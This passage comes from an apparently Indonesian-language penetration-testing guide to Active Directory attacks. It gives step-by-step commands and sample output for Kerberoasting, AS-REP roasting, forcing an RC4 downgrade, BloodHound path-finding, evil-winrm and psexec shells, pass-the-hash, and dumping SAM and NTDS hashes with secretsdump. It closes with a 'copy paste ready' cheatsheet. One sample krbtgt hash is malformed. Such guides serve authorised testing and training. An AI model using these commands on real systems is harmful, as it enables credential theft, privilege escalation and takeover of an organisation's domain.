WINRM  10.10.10.100  5985  DC01  [+] CORP\svc_sql:Summer2023! (Pwn3d!)
```

➡️ **Spawn shell:**

Bash

```
evil-winrm -i $DC_IP -u "$FOUND_USER" -p "$FOUND_PASS"

# Di dalam evil-winrm:
*Evil-WinRM* PS C:\Users\svc_sql\Documents> whoami
corp\svc_sql
*Evil-WinRM* PS> whoami /priv
# → Ke <a href="/docs/windows-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">45_windows_privesc_workflow.md</a>
*Evil-WinRM* PS> whoami /groups
# → Cek group membership
```

**OUTPUT BERHASIL ✅ — MSSQL:**

text

```
MSSQL  10.10.10.100  1433  DC01  [+] CORP\svc_sql:Summer2023! (Pwn3d!)
```

➡️ Lanjut ke [Pentest Workflow: Microsoft SQL Server (MSSQL) Exploitation](/docs/mssql):

Bash

```
impacket-mssqlclient $DOMAIN/$FOUND_USER:$FOUND_PASS@$DC_IP
# Di dalam mssql prompt:
# SQL> SELECT @@version;
# SQL> SELECT is_srvrolemember('sysadmin');
# → Jika sysadmin = 1, bisa enable xp_cmdshell
```

**OUTPUT: semua service GAGAL:**

text

```
SMB    [+] CORP\svc_sql:Summer2023!
WINRM  [-] CORP\svc_sql:Summer2023! (Pwn3d! NOT)  
RDP    [-]
MSSQL  [-]
```

➡️ User valid tapi tidak punya remote access. Harus enumerate privilege via BloodHound:

Bash

```
# Ke Langkah 5.3 — BloodHound collection
```

---

### Langkah 5.3 — BloodHound Collection (Dengan Credential Baru)

Bash

```
# Collect data BloodHound dari Linux
bloodhound-python \
    -u "$FOUND_USER" \
    -p "$FOUND_PASS" \
    -ns $DC_IP \
    -d $DOMAIN \
    -c All \
    --zip \
    -o ~/ad_loot/bloodhound/

echo "[*] BloodHound data collected. Import ke BloodHound GUI."
ls ~/ad_loot/bloodhound/

# Start BloodHound jika belum running
# Di terminal terpisah:
# sudo neo4j start
# bloodhound &
```

**Setelah import ke BloodHound, cari:**

text

```
# Query penting di BloodHound untuk credential baru:

1. Mark user sebagai "Owned": klik kanan user → Mark as Owned

2. Cari attack path:
   - "Shortest Paths to Domain Admins from Owned Principals"
   - "Shortest Paths to High Value Targets from Owned Principals"

3. Cek outbound control dari user ini:
   - Klik user → "Outbound Object Control"
   - GenericAll, GenericWrite, WriteDACL, WriteOwner, AddMember, ForceChangePassword

4. Cek group membership:
   - Apakah member "Remote Desktop Users"?
   - Apakah member "Remote Management Users"?
   - Apakah member "Account Operators"? (bisa add user ke group)
   - Apakah member "Backup Operators"? (bisa baca file system)
```

**OUTPUT BERHASIL ✅ — Ketemu ACL abuse path:**

text

```
# Di BloodHound: svc_sql memiliki GenericWrite atas object "helpdesk"
# Atau: svc_sql adalah member "Account Operators"
```

➡️ Lanjut ke [🔐 File 38 — Active Directory ACL Abuse Workflow](/docs/ad-acl-abuse)

---

## ═══════════════════════════════════════

## FASE 6: LANJUTAN — CEK KERBEROASTING LAGI DENGAN CREDENTIAL BARU

## ═══════════════════════════════════════

> Setiap kali dapat credential baru, ulangi Kerberoasting dan AS-REP Roasting dengan credential tersebut. Sering ada SPN yang tidak terlihat dengan credential sebelumnya!

Bash

```
# Dengan credential yang baru ditemukan dari crack
impacket-GetUserSPNs \
    -dc-ip $DC_IP \
    $DOMAIN/$FOUND_USER:$FOUND_PASS \
    -request \
    -outputfile ~/ad_loot/hashes/kerberoast_with_new_creds.txt

impacket-GetNPUsers \
    -dc-ip $DC_IP \
    $DOMAIN/$FOUND_USER:$FOUND_PASS \
    -request \
    -format hashcat \
    -outputfile ~/ad_loot/hashes/asrep_with_new_creds.txt

# Jika ada hash baru yang tidak ketahuan sebelumnya
cat ~/ad_loot/hashes/kerberoast_with_new_creds.txt
cat ~/ad_loot/hashes/asrep_with_new_creds.txt
```

---

## ═══════════════════════════════════════

## FASE 7: EXPLOITATION — SETELAH DAPAT ADMIN/PWNED

## ═══════════════════════════════════════

### PATH A — WinRM Shell → Privesc

Bash

```
# Jika WinRM Pwn3d
evil-winrm -i $DC_IP -u "$FOUND_USER" -p "$FOUND_PASS"

# Di dalam shell — cek privilege untuk privesc
*Evil-WinRM* PS> whoami /all
*Evil-WinRM* PS> whoami /priv
*Evil-WinRM* PS> net user $FOUND_USER /domain
*Evil-WinRM* PS> net group "Domain Admins" /domain

# Cek apakah ada SeImpersonatePrivilege
*Evil-WinRM* PS> whoami /priv | findstr "Se"
# Jika ada SeImpersonatePrivilege → ke <a href="/docs/token-impersonation" class="text-[#00b4d8] hover:underline font-mono font-semibold">46_token_impersonation_workflow.md</a>

# Upload dan jalankan WinPEAS untuk full privesc check
*Evil-WinRM* PS> upload /usr/share/peass/winpeas/winPEASx64.exe
*Evil-WinRM* PS> ./winPEASx64.exe
# → Ke <a href="/docs/windows-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">45_windows_privesc_workflow.md</a>
```

### PATH B — Pass-The-Hash jika Punya NTLM Hash

Bash

```
# Jika dari dump sebelumnya punya NTLM hash administrator
export ADMIN_HASH="aad3b435b51404eeaad3b435b51404ee:FC525C9683E8FE067095BA2DDC971881"

# Test PTH ke berbagai service
nxc smb $DC_IP -u "Administrator" -H "$ADMIN_HASH"
nxc winrm $DC_IP -u "Administrator" -H "$ADMIN_HASH"

# Shell dengan PTH
evil-winrm -i $DC_IP -u "Administrator" -H "FC525C9683E8FE067095BA2DDC971881"

# PsExec PTH (kasih SYSTEM shell)
impacket-psexec "Administrator@$DC_IP" -hashes "$ADMIN_HASH"
```

**OUTPUT BERHASIL ✅:**

text

```
Microsoft Windows [Version 10.0.17763.2628]
C:\Windows\system32> whoami
nt authority\system
```

### PATH C — Dump Credentials untuk Lateral Movement

Bash

```
# Dari shell yang sudah didapat — dump credential untuk pivot
# (jika sudah punya admin di target)
impacket-secretsdump "$DOMAIN/$FOUND_USER:$FOUND_PASS@$DC_IP"

# Atau dari evil-winrm yang sudah dapat admin
impacket-secretsdump "$DOMAIN/Administrator:AdminPass@$DC_IP"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:FC525C9683E8FE067095BA2DDC971881:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
svc_sql:1104:aad3b435b51404eeaad3b435b51404ee:A9FDFA038C4B75EBC76DC855DD74F0DA:::

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
CORP.LOCAL/Administrator:500:aad3b435b51404eeaad3b435b51404ee:FC525C9683E8FE067095BA2DDC971881:::
CORP.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:C24C1DC87E1D5EF3C8E4RA4C4FC2C30:::
```

Bash

```
# Simpan semua hash
echo "[*] Saving all hashes..."
impacket-secretsdump "$DOMAIN/$FOUND_USER:$FOUND_PASS@$DC_IP" \
    2>/dev/null > ~/ad_loot/hashes/secretsdump_all.txt

# Ekstrak NTLM hash saja untuk cracking/PTH
grep ":::" ~/ad_loot/hashes/secretsdump_all.txt | \
    awk -F':' '{print $1":"$4}' | \
    grep -v "^$" > ~/ad_loot/hashes/ntlm_hashes.txt

# Crack NTLM hash (mode 1000)
hashcat -m 1000 ~/ad_loot/hashes/ntlm_hashes.txt \
    /usr/share/wordlists/rockyou.txt \
    -w 3 \
    --force \
    -o ~/ad_loot/hashes/ntlm_cracked.txt
```

---

## ═══════════════════════════════════════

## FASE 8: ADVANCED SCENARIOS

## ═══════════════════════════════════════

### Skenario: Force RC4 / Downgrade Etype

> Jika target mendukung RC4 tapi tool default menggunakan AES256, bisa force ke RC4 untuk hash yang lebih mudah di-crack.

Bash

```
# Request TGS dengan etype 23 (RC4) secara eksplisit
impacket-GetUserSPNs \
    -dc-ip $DC_IP \
    $DOMAIN/$USERNAME:$PASSWORD \
    -request \
    -etype 23 \
    -outputfile ~/ad_loot/hashes/kerb_forced_rc4.txt

# Verifikasi etype
head -1 ~/ad_loot/hashes/kerb_forced_rc4.txt | grep -o "krb5tgs\$[0-9]*"
```

**OUTPUT BERHASIL ✅:**

text

```
$krb5tgs$23$*svc_sql*...  ← etype 23 = RC4
```

**OUTPUT GAGAL ❌ — Masih dapat AES:**

text

```
$krb5tgs$18$*svc_sql*...  ← etype 18 = AES256, downgrade tidak berhasil
```

➡️ Domain policy tidak mengizinkan RC4. Harus crack AES256 dengan mode 19700.

---

### Skenario: Roasting dalam Trust Environment

Bash

```
# Jika BloodHound atau enumeration menunjukkan ada domain/forest trust
# Cari trust dulu
impacket-GetUserSPNs \
    -dc-ip $DC_IP \
    $DOMAIN/$USERNAME:$PASSWORD \
    -target-domain "trusted.domain.local" \
    -request \
    -outputfile ~/ad_loot/hashes/kerb_trusted_domain.txt

# Enumerate users dari trusted domain
impacket-GetNPUsers \
    "trusted.domain.local/" \
    -dc-ip $TRUSTED_DC_IP \
    -usersfile ~/ad_loot/users/users.txt \
    -no-pass \
    -outputfile ~/ad_loot/hashes/asrep_trusted.txt
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`KRB_AP_ERR_SKEW`|Clock skew > 5 menit|`sudo ntpdate $DC_IP` → sync waktu|
|`KDC_ERR_PREAUTH_FAILED`|Credential salah|Validasi via SMB dulu, cek format domain|
|`KDC_ERR_C_PRINCIPAL_UNKNOWN`|Username tidak ada|Verifikasi username via kerbrute atau RID brute|
|`No entries found`|Tidak ada SPN / tidak ada pre-auth user|Tidak applicable, lanjut ke teknik lain|
|`Token length exception`|Hash terpotong|`tr -d '\r'` lalu re-request hash|
|`Hash format not recognized`|Mode hashcat salah|Cek prefix: krb5tgs$23=13100, krb5asrep$23=18200|
|`Status Exhausted`|Wordlist tidak cocok|Custom wordlist + rules, atau coba CeWL|
|`NETWORK ERROR kerbrute`|Port 88 tidak reachable|`nmap -Pn -p 88 $DC_IP` — verifikasi DC|
|`Access Denied Rubeus`|Context/token salah|`whoami /groups` — cek dari domain context|
|`Hash cracked tapi login gagal`|Password expired/diganti|Re-validate via SMB, cek account status|
|`impacket argument error`|Versi impacket berbeda|`impacket-GetUserSPNs --help` — cek syntax lokal|
|`CCache initialization failed`|Kerberos ticket cache issue|Gunakan password bukan ccache, atau `kdestroy`|
|`Connection timeout port 88`|Firewall atau IP salah|Cek routing, VPN, IP DC yang benar|
|`GetNPUsers: Kerberos error`|LDAP/Kerberos issue|Coba `-format hashcat` explicit|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Environment AD terdeteksi (dari nmap/nxc/SMB workflow)
│
├─ FASE 0: Setup Environment + Sinkronisasi Waktu
│   └─ [Clock skew OK] → Lanjut
│
├─ FASE 1: Punya credential valid?
│   ├─ [YA] → Ke FASE 3 (Kerberoasting) + FASE 4 (AS-REP dengan creds)
│   └─ [TIDAK] → Ke FASE 2 (Username Enumeration)
│
├─ FASE 2: Username Enumeration (jika tidak punya creds)
│   ├─ [Username list didapat] → Ke FASE 4 (AS-REP tanpa creds)
│   └─ [Gagal dapat username] → Coba RID brute via SMB anonymous
│
├─ FASE 3: Kerberoasting (butuh creds)
│   ├─ [Ada SPN] → Request TGS → Identifikasi etype → Crack
│   │   ├─ [Crack berhasil] → FASE 5 (Validasi + test semua service)
│   │   └─ [Crack gagal] → Coba custom wordlist + rules
│   └─ [Tidak ada SPN] → Skip ke FASE 4
│
├─ FASE 4: AS-REP Roasting
│   ├─ [Ada pre-auth disabled user] → Dapatkan hash → Crack
│   │   ├─ [Crack berhasil] → FASE 5 (Validasi)
│   │   └─ [Crack gagal] → Coba wordlist lebih besar
│   └─ [Semua user punya pre-auth] → Tidak applicable
│
├─ FASE 5: Validasi Credential ke Semua Service
│   ├─ [(Pwn3d!) Admin] → FASE 7 (Exploitation - dump creds)
│   ├─ [WinRM Pwn3d] → evil-winrm → privesc
│   ├─ [MSSQL valid] → ke <a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14b_mssql_workflow.md</a>
│   ├─ [SSH valid] → ke <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
│   └─ [Hanya SMB standard] → BloodHound → ACL abuse
│
├─ FASE 6: Dapat creds baru → Ulangi Kerberoasting/AS-REP
│
└─ FASE 7: Post-Exploitation
    ├─ Dump SAM/NTDS dengan secretsdump
    ├─ Pass-The-Hash ke host lain
    ├─ Pivot ke domain lain (trust)
    └─ Lanjut ke <a href="/docs/ad-acl-abuse" class="text-[#00b4d8] hover:underline font-mono font-semibold">38_ad_acl_abuse_workflow.md</a> / [🧭 Workflow 42 — Lateral Movement](/docs/lateral-movement)
```

---

## Cross-Service Credential Testing Chart

Setiap kali dapat credential dari Kerberoasting/AS-REP Roasting:

text

```
Kerberoast/ASREP Creds Found
         │
         ├─ ─→ Port 445  (SMB)     → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
         ├──→ Port 22   (SSH)     → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
         ├──→ Port 5985 (WinRM)   → evil-winrm
         ├──→ Port 3389 (RDP)     → <a href="/docs/rdp" class="text-[#00b4d8] hover:underline font-mono font-semibold">12_rdp_workflow.md</a>
         ├──→ Port 1433 (MSSQL)   → <a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14b_mssql_workflow.md</a>
         ├──→ Port 3306 (MySQL)   → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
         ├──→ Port 389  (LDAP)    → <a href="/docs/ldap" class="text-[#00b4d8] hover:underline font-mono font-semibold">11_ldap_workflow.md</a>
         └──→ AD Pivot            → <a href="/docs/ad-acl-abuse" class="text-[#00b4d8] hover:underline font-mono font-semibold">38_ad_acl_abuse_workflow.md</a>
                                  → <a href="/docs/lateral-movement" class="text-[#00b4d8] hover:underline font-mono font-semibold">42_lateral_movement_workflow.md</a>
                                  → <a href="/docs/domain-persistence" class="text-[#00b4d8] hover:underline font-mono font-semibold">43_domain_persistence_workflow.md</a>
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export DC_IP="10.10.10.100"
export DOMAIN="corp.local"
export USERNAME="john.smith"
export PASSWORD="Password123!"
mkdir -p ~/ad_loot/{hashes,creds,users,bloodhound}

# === SYNC WAKTU (WAJIB DULU!) ===
sudo ntpdate $DC_IP

# === KONFIRMASI ENVIRONMENT ===
nxc smb $DC_IP
nmap -Pn -p 88,389,445 $DC_IP --open

# === USERNAME ENUMERATION (tanpa creds) ===
kerbrute userenum --dc $DC_IP -d $DOMAIN \
    /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
    -o ~/ad_loot/users/valid_users.txt

# === AS-REP ROASTING tanpa creds ===
impacket-GetNPUsers $DOMAIN/ -dc-ip $DC_IP \
    -usersfile ~/ad_loot/users/users.txt \
    -no-pass -format hashcat \
    -outputfile ~/ad_loot/hashes/asrep_hashes.txt

# === KERBEROASTING dengan creds ===
impacket-GetUserSPNs -dc-ip $DC_IP $DOMAIN/$USERNAME:$PASSWORD  # enum dulu
impacket-GetUserSPNs -dc-ip $DC_IP $DOMAIN/$USERNAME:$PASSWORD \
    -request -outputfile ~/ad_loot/hashes/kerb_hashes.txt       # request hash

# === CRACK ===
hashcat -m 13100 ~/ad_loot/hashes/kerb_hashes.txt \
    /usr/share/wordlists/rockyou.txt -w 3 --force          # Kerberoast RC4
hashcat -m 19700 ~/ad_loot/hashes/kerb_hashes.txt \
    /usr/share/wordlists/rockyou.txt -w 3 --force          # Kerberoast AES256
hashcat -m 18200 ~/ad_loot/hashes/asrep_hashes.txt \
    /usr/share/wordlists/rockyou.txt -w 3 --force          # AS-REP
hashcat -m 13100 ~/ad_loot/hashes/kerb_hashes.txt --show   # lihat hasil

# === VALIDASI CREDENTIAL ===
nxc smb $DC_IP -u "FOUND_USER" -p "FOUND_PASS"
nxc winrm $DC_IP -u "FOUND_USER" -p "FOUND_PASS"
nxc mssql $DC_IP -u "FOUND_USER" -p "FOUND_PASS"

# === SHELL ===
evil-winrm -i $DC_IP -u "FOUND_USER" -p "FOUND_PASS"       # WinRM
impacket-mssqlclient $DOMAIN/FOUND_USER:FOUND_PASS@$DC_IP   # MSSQL

# === DUMP CREDS (jika sudah admin) ===
impacket-secretsdump $DOMAIN/FOUND_USER:FOUND_PASS@$DC_IP

# === PTH ===
nxc smb $DC_IP -u "Administrator" -H "NTLM_HASH"
evil-winrm -i $DC_IP -u "Administrator" -H "NTLM_HASH"

# === BLOODHOUND ===
bloodhound-python -u "$USERNAME" -p "$PASSWORD" \
    -ns $DC_IP -d $DOMAIN -c All --zip -o ~/ad_loot/bloodhound/

# === NETEXEC SHORTCUTS ===
nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" --kerberoasting ~/ad_loot/hashes/kerb_nxc.txt
nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" --asreproast ~/ad_loot/hashes/asrep_nxc.txt
```

---

> **➡️ NEXT:** Setelah dapat credentials dari Kerberoasting/AS-REP Roasting dan tahu account punya ACL tertentu di BloodHound, lanjut ke **[🔐 File 38 — Active Directory ACL Abuse Workflow](/docs/ad-acl-abuse)** untuk abuse GenericAll, GenericWrite, WriteDACL, dan ACL lainnya untuk eskalasi privilege ke Domain Admin.